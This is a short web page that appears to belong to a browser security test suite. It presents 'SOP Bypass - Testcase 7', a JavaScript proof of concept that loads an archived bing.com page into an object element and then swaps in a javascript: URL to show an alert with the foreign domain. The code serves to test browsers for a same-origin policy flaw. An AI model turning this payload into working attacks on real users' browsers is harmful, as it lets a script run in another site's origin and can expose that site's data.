---
layout: default
title: SOP Bypass - Testcase 7
permalink: /sop/new/7
---

# SOP Bypass - Testcase 7

<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="myfunction()">
<script>
function myfunction() {
    object = document.createElement("object"); 
    object.setAttribute("data", "https://web.archive.org/web/20180831120256/http://www.bing.com");
    document.body.appendChild(object);
    object.onload = function() {
        object.setAttribute("data", "javascript:alert(document.domain)");
        object.innerHTML = "foobar";
    }
}
</script>

**Note:**
If page displays an alert box displaying bing.com, your browser is vulnerable to SOP bypass.
